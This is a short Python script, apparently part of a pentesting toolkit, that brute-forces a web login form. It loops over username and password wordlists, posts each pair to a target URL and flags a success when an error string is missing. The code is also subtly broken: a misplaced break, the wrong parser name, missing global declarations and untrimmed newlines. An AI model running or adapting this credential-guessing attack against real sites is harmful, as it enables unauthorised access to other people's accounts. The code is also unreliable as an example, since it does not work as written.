import requests
from bs4 import BeautifulSoup

user_L = "Pentesting/Attack/Tools/users.txt"
password_L = "Pentesting/Attack/Tools/passes.txt"
users = []
passwords = []
user_parameter = "user"			
pass_parameter = "pass"			
submit_parameter1 = "submit"	
submit_parameter2 = "Login"		
fail_message = "Error"	
global state
global resultPassword
global resultUser
state = False
resultPassword = ""
resultUser = ""


#############################
#                           #
#  Post request with data   #
#                           #
#############################


def Start_login(target_url):
    with open(user_L, "r") as file:
        for line in file:
            users.append(line)
    with open(password_L, "r") as file:
        for line in file:
            passwords.append(line)
    
    for user in users:
        for password in passwords:
            http = requests.post(target_url, data={user_parameter: user, pass_parameter: password, submit_parameter1: submit_parameter2})
            content = BeautifulSoup(http.content, "html parser").get_text()
            if fail_message not in content:
                print(f"Password found! : {password}")
                state = True
                resultPassword = password
                resultUser = user
            break
        else:
            print(f"Invalid password {password}")





#############################
#                           #
#       Return values       #
#                           #
#############################
            
def GetState():
    return state

def GetPassword():
    return resultPassword
def GetUser():
    return resultUser